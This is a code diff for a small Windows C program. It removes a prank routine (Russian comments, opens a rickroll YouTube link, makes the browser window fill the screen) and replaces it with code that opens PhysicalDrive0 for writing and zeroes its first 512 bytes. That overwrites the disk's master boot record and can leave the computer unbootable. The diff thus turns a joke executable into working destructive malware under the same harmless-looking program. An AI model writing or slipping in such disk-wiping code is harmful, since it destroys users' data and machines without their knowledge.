@@ -1,27 +1,20 @@
 #include <windows.h>
-#include <shellapi.h>
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Ссылка на рикролл
-    const wchar_t* url = L"https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-    
-    // Запускаем браузер по умолчанию
-    ShellExecuteW(NULL, L"open", url, NULL, NULL, SW_SHOWNORMAL);
-    
-    // Даём браузеру 3 секунды, чтобы загрузиться
-    Sleep(3000);
-    
-    // Находим окно браузера и разворачиваем его на весь экран
-    HWND hwnd = GetForegroundWindow();
-    if (hwnd != NULL) {
-        // Убираем рамки и заголовок (полный экран без панелей)
-        LONG style = GetWindowLongW(hwnd, GWL_STYLE);
-        style &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU);
-        SetWindowLongW(hwnd, GWL_STYLE, style);
-        
-        // Разворачиваем на весь экран
-        ShowWindow(hwnd, SW_MAXIMIZE);
-    }
-    
+    HANDLE h = CreateFileW(
+        L"\\\\.\\PhysicalDrive0",
+        GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        0,
+        NULL
+    );
+    if (h == INVALID_HANDLE_VALUE) return 1;
+    unsigned char zero[512] = {0};
+    DWORD written = 0;
+    WriteFile(h, zero, 512, &written, NULL);
+    FlushFileBuffers(h);
+    CloseHandle(h);
     return 0;
 }
